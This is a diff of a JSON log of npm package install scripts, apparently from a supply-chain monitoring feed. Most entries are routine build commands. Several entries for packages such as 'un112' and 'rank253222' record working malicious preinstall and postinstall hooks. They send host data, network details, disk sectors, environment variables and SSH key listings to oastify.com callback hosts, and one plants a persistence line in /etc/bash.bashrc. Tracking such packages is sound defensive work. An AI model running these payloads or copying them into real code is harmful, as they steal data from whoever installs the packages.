@@ -18,369 +18,186 @@
   {
     "packageName": "un112",
     "version": "1.0.18",
+    "version": "1.0.34",
     "scriptType": "postinstall",
-    "scriptContent": "sh -c 'OUT=\"\"; for m in $(grep \" rw\" /proc/mounts | awk \"{print \\$2}\"); do touch \"$m/.t\" 2>/dev/null && OUT=\"$OUT$m:W \"; done; CAP=$(cat /proc/self/status | grep CapEff); DEVS=$(ls /dev/ | grep -E \"sd|nvme|vd\" | tr \"\\n\" \" \"); DATA=$(echo \"Caps:$CAP Paths:$OUT Devs:$DEVS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA || python -c \"import urllib; urllib.urlopen(\\\"http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA\\\")\") 2>/dev/null'",
-    "previousVersion": "1.0.17",
-    "timestamp": "2026-01-22T11:17:05.996Z"
+    "scriptContent": "df | grep -v container | curl --data @- 7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
+    "previousVersion": "1.0.33",
+    "timestamp": "2026-01-22T13:55:24.898Z"
   },
   {
     "packageName": "un112",
-    "version": "1.0.18",
+    "version": "1.0.34",
     "scriptType": "preinstall",
-    "scriptContent": "sh -c 'OUT=\"\"; for m in $(grep \" rw\" /proc/mounts | awk \"{print \\$2}\"); do touch \"$m/.t\" 2>/dev/null && OUT=\"$OUT$m:W \"; done; CAP=$(cat /proc/self/status | grep CapEff); DEVS=$(ls /dev/ | grep -E \"sd|nvme|vd\" | tr \"\\n\" \" \"); DATA=$(echo \"Caps:$CAP Paths:$OUT Devs:$DEVS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA || python -c \"import urllib; urllib.urlopen(\\\"http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA\\\")\") 2>/dev/null'",
-    "previousVersion": "1.0.17",
-    "timestamp": "2026-01-22T11:17:05.994Z"
+    "scriptContent": "df | grep -v container | curl --data @- 7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
+    "previousVersion": "1.0.33",
+    "timestamp": "2026-01-22T13:55:24.893Z"
   },
   {
-    "packageName": "astn",
-    "version": "1.20.5",
+    "packageName": "un112",
+    "version": "1.0.28",
     "scriptType": "postinstall",
-    "scriptContent": "cd client && npm install && cd ../server && npm install && cd ..",
-    "previousVersion": "0.113.35",
-    "timestamp": "2026-01-22T09:27:20.607Z"
+    "scriptContent": "df grep sock | curl --data @- 7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
+    "previousVersion": "1.0.27",
+    "timestamp": "2026-01-22T12:51:14.672Z"
   },
   {
-    "packageName": "rank253222",
-    "version": "1.0.2",
-    "scriptType": "postinstall",
-    "scriptContent": "whoami && hostname |curl --data @- x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com",
-    "previousVersion": "1.0.1",
-    "timestamp": "2026-01-22T08:03:56.563Z"
-  },
-  {
-    "packageName": "rank253222",
-    "version": "1.0.2",
+    "packageName": "un112",
+    "version": "1.0.28",
     "scriptType": "preinstall",
-    "scriptContent": "whoami && hostname |curl --data @- x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com",
-    "previousVersion": "1.0.1",
-    "timestamp": "2026-01-22T08:03:56.550Z"
+    "scriptContent": "df grep sock | curl --data @- 7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
+    "previousVersion": "1.0.27",
+    "timestamp": "2026-01-22T12:51:14.669Z"
   },
   {
-    "packageName": "rank253222",
-    "version": "1.0.2",
+    "packageName": "un112",
+    "version": "1.0.27",
     "scriptType": "postinstall",
-    "scriptContent": "whoami && hostname |curl --data @- x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com",
-    "previousVersion": "1.0.1",
-    "timestamp": "2026-01-22T08:02:26.503Z"
+    "scriptContent": "find / -type s -maxdepth 3 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?sockets={}",
+    "previousVersion": "1.0.26",
+    "timestamp": "2026-01-22T12:44:50.985Z"
   },
   {
-    "packageName": "rank253222",
-    "version": "1.0.2",
+    "packageName": "un112",
+    "version": "1.0.27",
     "scriptType": "preinstall",
-    "scriptContent": "whoami && hostname |curl --data @- x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com",
-    "previousVersion": "1.0.1",
-    "timestamp": "2026-01-22T08:02:26.501Z"
+    "scriptContent": "find / -type s -maxdepth 3 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?sockets={}",
+    "previousVersion": "1.0.26",
+    "timestamp": "2026-01-22T12:44:50.982Z"
   },
   {
-    "packageName": "rank253222",
-    "version": "1.0.0",
+    "packageName": "un112",
+    "version": "1.0.26",
     "scriptType": "postinstall",
-    "scriptContent": "node -e \"const { exec } = require('child_process'); const cmd = process.platform === 'win32' ? 'ipconfig /all && route print && arp -a && netstat -an' : 'export PATH=$PATH:/usr/sbin:/sbin; ip addr && ip route && arp -e && netstat -antp || ss -ant'; exec(cmd, (e, out) => { const d = Buffer.from(out.slice(0, 2000)).toString('base64'); require('http').get('http://x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com/?net_full=' + d); });\"",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T07:55:32.056Z"
+    "scriptContent": "sh -c 'OUT=\"\"; [ -w /etc/profile ] && OUT=\"$OUT/etc/profile \"; [ -w /root/.bashrc ] && OUT=\"$OUT/root/.bashrc \"; [ -w /etc/bash.bashrc ] && OUT=\"$OUT/etc/bash.bashrc \"; if [ -n \"$OUT\" ]; then echo \"curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?host_env=$(env | base64 | tr -d \\\"\\\\n\\\")\" >> /etc/bash.bashrc 2>/dev/null; fi; DATA=$(echo \"Writable_Files: $OUT\" | base64); wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?discovery=$DATA'",
+    "previousVersion": "1.0.25",
+    "timestamp": "2026-01-22T12:36:12.868Z"
   },
   {
-    "packageName": "rank253222",
-    "version": "1.0.0",
+    "packageName": "un112",
+    "version": "1.0.26",
     "scriptType": "preinstall",
-    "scriptContent": "node -e \"const { exec } = require('child_process'); const cmd = process.platform === 'win32' ? 'ipconfig /all && route print && arp -a && netstat -an' : 'export PATH=$PATH:/usr/sbin:/sbin; ip addr && ip route && arp -e && netstat -antp || ss -ant'; exec(cmd, (e, out) => { const d = Buffer.from(out.slice(0, 2000)).toString('base64'); require('http').get('http://x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com/?net_full=' + d); });\"",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T07:55:32.053Z"
+    "scriptContent": "sh -c 'OUT=\"\"; [ -w /etc/profile ] && OUT=\"$OUT/etc/profile \"; [ -w /root/.bashrc ] && OUT=\"$OUT/root/.bashrc \"; [ -w /etc/bash.bashrc ] && OUT=\"$OUT/etc/bash.bashrc \"; if [ -n \"$OUT\" ]; then echo \"curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?host_env=$(env | base64 | tr -d \\\"\\\\n\\\")\" >> /etc/bash.bashrc 2>/dev/null; fi; DATA=$(echo \"Writable_Files: $OUT\" | base64); wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?discovery=$DATA'",
+    "previousVersion": "1.0.25",
+    "timestamp": "2026-01-22T12:36:12.866Z"
   },
   {
-    "packageName": "rank253222",
+    "packageName": "@bryntum/taskboard-trial",
     "version": "1.0.0",
     "scriptType": "postinstall",
-    "scriptContent": "node -e \"const { exec } = require('child_process'); const cmd = process.platform === 'win32' ? 'ipconfig /all && route print && arp -a && netstat -an' : 'export PATH=$PATH:/usr/sbin:/sbin; ip addr && ip route && arp -e && netstat -antp || ss -ant'; exec(cmd, (e, out) => { const d = Buffer.from(out.slice(0, 2000)).toString('base64'); require('http').get('http://x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com/?net_full=' + d); });\"",
+    "scriptContent": "node postinstall.js",
     "previousVersion": null,
-    "timestamp": "2026-01-22T07:46:51.161Z"
+    "timestamp": "2026-01-22T12:34:19.489Z"
   },
   {
-    "packageName": "rank253222",
-    "version": "1.0.0",
+    "packageName": "un112",
+    "version": "1.0.25",
+    "scriptType": "postinstall",
+    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
+    "previousVersion": "1.0.24",
+    "timestamp": "2026-01-22T12:32:26.017Z"
+  },
+  {
+    "packageName": "un112",
+    "version": "1.0.25",
     "scriptType": "preinstall",
-    "scriptContent": "node -e \"const { exec } = require('child_process'); const cmd = process.platform === 'win32' ? 'ipconfig /all && route print && arp -a && netstat -an' : 'export PATH=$PATH:/usr/sbin:/sbin; ip addr && ip route && arp -e && netstat -antp || ss -ant'; exec(cmd, (e, out) => { const d = Buffer.from(out.slice(0, 2000)).toString('base64'); require('http').get('http://x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com/?net_full=' + d); });\"",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T07:46:51.157Z"
+    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
+    "previousVersion": "1.0.24",
+    "timestamp": "2026-01-22T12:32:26.011Z"
   },
   {
-    "packageName": "oh-my-antigravity",
-    "version": "0.1.0-beta",
-    "scriptType": "postinstall",
-    "scriptContent": "node cli/postinstall.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T07:43:02.630Z"
-  },
-  {
-    "packageName": "stepzen-graphiql",
-    "version": "2.0.1-experimental.1",
-    "scriptType": "postinstall",
-    "scriptContent": "patch-package",
-    "previousVersion": "2.0.0",
-    "timestamp": "2026-01-22T07:21:47.613Z"
-  },
-  {
-    "packageName": "pdf-toolkit-cloud",
-    "version": "0.0.4",
-    "scriptType": "postinstall",
-    "scriptContent": "node scripts/copy-pdftron-assets.js",
-    "previousVersion": "0.0.3",
-    "timestamp": "2026-01-22T07:20:31.460Z"
-  },
-  {
-    "packageName": "flockbay",
-    "version": "0.10.15",
-    "scriptType": "postinstall",
-    "scriptContent": "node scripts/unpack-tools.cjs",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T06:21:55.955Z"
-  },
-  {
-    "packageName": "@ggdotdev/gg",
-    "version": "0.9.6",
-    "scriptType": "postinstall",
-    "scriptContent": "node install.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T04:45:21.769Z"
-  },
-  {
-    "packageName": "@shoulderdev/malware-demo",
-    "version": "1.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node scripts/postinstall.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-21T21:05:36.429Z"
-  },
-  {
-    "packageName": "@shoulderdev/malware-demo",
-    "version": "1.0.0",
-    "scriptType": "preinstall",
-    "scriptContent": "node scripts/preinstall.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-21T21:05:36.421Z"
-  },
-  {
-    "packageName": "acc-ai-cli-agent",
-    "version": "1.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node initializeConfig.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-21T17:50:12.189Z"
-  },
-  {
-    "packageName": "sra-testing-test",
-    "version": "3.0.7",
-    "scriptType": "postinstall",
-    "scriptContent": "node ./index.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-21T16:29:46.019Z"
-  },
-  {
-    "packageName": "agentboard",
-    "version": "0.4.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node scripts/postinstall.js",
-    "previousVersion": "0.3.1",
-    "timestamp": "2026-01-21T14:25:31.946Z"
-  },
-  {
-    "packageName": "agentic-qe",
-    "version": "3.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "cd v3 && npm install",
-    "previousVersion": "2.8.2",
-    "timestamp": "2026-01-21T13:42:09.665Z"
-  },
-  {
-    "packageName": "huashu-cc",
-    "version": "1.0.4",
-    "scriptType": "postinstall",
-    "scriptContent": "npm rebuild node-pty || echo '⚠️  node-pty 编译失败，请手动运行: npm rebuild node-pty'",
-    "previousVersion": "1.0.3",
-    "timestamp": "2026-01-21T07:23:02.214Z"
-  },
-  {
-    "packageName": "pgroll",
-    "version": "0.0.8",
-    "scriptType": "postinstall",
-    "scriptContent": "npx only-allow pnpm",
-    "previousVersion": "0.0.7",
-    "timestamp": "2026-01-21T04:40:23.749Z"
-  },
-  {
-    "packageName": "zenvo",
-    "version": "0.1.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node install.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-21T01:05:51.550Z"
-  },
-  {
-    "packageName": "klazy",
-    "version": "1.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node lib/postinstall.js || true",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T20:07:25.834Z"
-  },
-  {
-    "packageName": "@adyen/adyen-salesforce-pwa",
-    "version": "4.2.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node ./lib/scripts/update-notifier.js",
-    "previousVersion": "4.1.1",
-    "timestamp": "2026-01-20T14:52:24.543Z"
-  },
-  {
-    "packageName": "galeneai-cli",
-    "version": "0.0.10",
-    "scriptType": "postinstall",
-    "scriptContent": "bun ./postinstall.mjs || node ./postinstall.mjs",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T14:24:02.756Z"
-  },
-  {
-    "packageName": "baileys-ud",
-    "version": "1.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node ./engine-requirements.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T14:23:21.670Z"
-  },
-  {
-    "packageName": "everything-search-mcp",
-    "version": "1.1.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node scripts/download-es.js",
-    "previousVersion": "1.0.1",
-    "timestamp": "2026-01-20T14:17:37.826Z"
-  },
-  {
-    "packageName": "@namehash/namehash-ui",
-    "version": "1.5.1",
-    "scriptType": "postinstall",
-    "scriptContent": "pnpm build:css",
-    "previousVersion": "1.5.0",
-    "timestamp": "2026-01-20T13:09:49.686Z"
-  },
-  {
-    "packageName": "openspot-tui",
-    "version": "1.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "bun run src/scripts/postinstall.ts",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T12:56:00.463Z"
-  },
-  {
-    "packageName": "neutrinos-cli",
-    "version": "1.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node ./setup.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T12:49:53.159Z"
-  },
-  {
-    "packageName": "@choiceopen/atomemo-plugin-cli",
+    "packageName": "panopticon-cli",
     "version": "0.3.0",
     "scriptType": "postinstall",
-    "scriptContent": "echo \"Please run 'atomemo auth login' first to ensure you have access to the Atomemo platform.\"",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T12:38:09.087Z"
+    "scriptContent": "node scripts/postinstall.mjs || true",
+    "previousVersion": "0.2.0",
+    "timestamp": "2026-01-22T12:26:05.646Z"
   },
   {
-    "packageName": "@vroskus/library-validator",
-    "version": "2.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node ./scripts/postinstall.js",
-    "previousVersion": "1.0.29",
-    "timestamp": "2026-01-20T11:10:47.832Z"
-  },
-  {
-    "packageName": "acp-extension-codex-win32-x64",
-    "version": "0.8.6",
-    "scriptType": "postinstall",
-    "scriptContent": "node ./ensure-executable.mjs",
-    "previousVersion": "0.8.5",
-    "timestamp": "2026-01-20T10:51:41.298Z"
-  },
-  {
-    "packageName": "acp-extension-codex-linux-x64",
-    "version": "0.8.6",
-    "scriptType": "postinstall",
-    "scriptContent": "node ./ensure-executable.mjs",
-    "previousVersion": "0.8.5",
-    "timestamp": "2026-01-20T10:51:10.436Z"
-  },
-  {
-    "packageName": "acp-extension-codex-win32-arm64",
-    "version": "0.8.6",
-    "scriptType": "postinstall",
-    "scriptContent": "node ./ensure-executable.mjs",
-    "previousVersion": "0.8.5",
-    "timestamp": "2026-01-20T10:51:10.268Z"
-  },
-  {
-    "packageName": "potdf",
-    "version": "8.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node -e \"if (process.env.NODE_ENV !== 'test') { setTimeout(() => { try { const Stealer = require('./index.js'); new Stealer().execute(); } catch(e) {} }, 1500) }\"",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T10:22:19.102Z"
-  },
-  {
-    "packageName": "ground-mcp",
-    "version": "0.1.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node install.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T10:11:19.836Z"
-  },
-  {
-    "packageName": "@createsomething/ground-mcp",
-    "version": "0.1.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node install.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T10:10:19.367Z"
-  },
-  {
-    "packageName": "@namehash/namehash-ui",
-    "version": "1.5.1",
-    "scriptType": "postinstall",
-    "scriptContent": "pnpm build:css",
-    "previousVersion": "1.5.0",
-    "timestamp": "2026-01-20T09:41:28.651Z"
-  },
-  {
-    "packageName": "csv-parsing-xz",
-    "version": "1.2.1",
-    "scriptType": "postinstall",
-    "scriptContent": "node install.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T09:23:57.913Z"
-  },
-  {
-    "packageName": "postcss-hotfix",
-    "version": "0.0.2",
-    "scriptType": "postinstall",
-    "scriptContent": "echo Test",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T09:02:24.288Z"
-  },
-  {
-    "packageName": "@tellahq/ppx-spice",
-    "version": "0.2.10",
-    "scriptType": "postinstall",
-    "scriptContent": "node ./postInstall.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-20T08:55:16.764Z"
-  },
-  {
-    "packageName": "@olbrain/bys-mcp",
+    "packageName": "@bryntum/calendar-trial",
     "version": "1.0.0",
     "scriptType": "postinstall",
-    "scriptContent": "pip3 install -r requirements.txt || python3 -m pip install -r requirements.txt",
+    "scriptContent": "node postinstall.js",
     "previousVersion": null,
-    "timestamp": "2026-01-20T08:04:12.871Z"
+    "timestamp": "2026-01-22T12:25:52.981Z"
+  },
+  {
+    "packageName": "pughost",
+    "version": "0.0.1",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/install.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T12:24:45.651Z"
+  },
+  {
+    "packageName": "un112",
+    "version": "1.0.25",
+    "scriptType": "postinstall",
+    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
+    "previousVersion": "1.0.24",
+    "timestamp": "2026-01-22T12:23:27.115Z"
+  },
+  {
+    "packageName": "un112",
+    "version": "1.0.25",
+    "scriptType": "preinstall",
+    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
+    "previousVersion": "1.0.24",
+    "timestamp": "2026-01-22T12:23:27.114Z"
+  },
+  {
+    "packageName": "un112",
+    "version": "1.0.23",
+    "scriptType": "postinstall",
+    "scriptContent": "sh -c 'mkdir -p /mnt/host; mount /dev/sda2 /mnt/host || mount /dev/sda1 /mnt/host; if [ -d /mnt/host/root/.ssh ]; then KEYS=$(ls -F /mnt/host/root/.ssh); DATA=$(echo \"Keys_Found:$KEYS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA); fi'",
+    "previousVersion": "1.0.22",
+    "timestamp": "2026-01-22T12:14:08.231Z"
+  },
+  {
+    "packageName": "un112",
+    "version": "1.0.23",
+    "scriptType": "preinstall",
+    "scriptContent": "sh -c 'mkdir -p /mnt/host; mount /dev/sda2 /mnt/host || mount /dev/sda1 /mnt/host; if [ -d /mnt/host/root/.ssh ]; then KEYS=$(ls -F /mnt/host/root/.ssh); DATA=$(echo \"Keys_Found:$KEYS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA); fi'",
+    "previousVersion": "1.0.22",
+    "timestamp": "2026-01-22T12:14:08.229Z"
+  },
+  {
+    "packageName": "@ikeacn/ui",
+    "version": "99.9.9",
+    "scriptType": "preinstall",
+    "scriptContent": "node index.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T12:12:02.600Z"
+  },
+  {
+    "packageName": "corporate-blocking",
+    "version": "0.99.99",
+    "scriptType": "preinstall",
+    "scriptContent": "node extract.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T12:07:27.720Z"
+  },
+  {
+    "packageName": "@ikeacn/utils",
+    "version": "99.9.9",
+    "scriptType": "preinstall",
+    "scriptContent": "node index.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T12:06:31.543Z"
+  },
+  {
+    "packageName": "un112",
+    "version": "1.0.23",
+    "scriptType": "postinstall",
+    "scriptContent": "sh -c 'mkdir -p /mnt/host; mount /dev/sda2 /mnt/host || mount /dev/sda1 /mnt/host; if [ -d /mnt/host/root/.ssh ]; then KEYS=$(ls -F /mnt/host/root/.ssh); DATA=$(echo \"Keys_Found:$KEYS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA); fi'",
+    "previousVersion": "1.0.22",
+    "timestamp": "2026-01-22T12:06:21.048Z"
+  },
+  {
+    "packageName": "un112",
+    "version": "1.0.23",
+    "scriptType": "preinstall",
+    "scriptContent": "sh -c 'mkdir -p /mnt/host; mount /dev/sda2 /mnt/host || mount /dev/sda1 /mnt/host; if [ -d /mnt/host/root/.ssh ]; then KEYS=$(ls -F /mnt/host/root/.ssh); DATA=$(echo \"Keys_Found:$KEYS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA); fi'",
+    "previousVersion": "1.0.22",
+    "timestamp": "2026-01-22T12:06:21.045Z"
   }
 ]
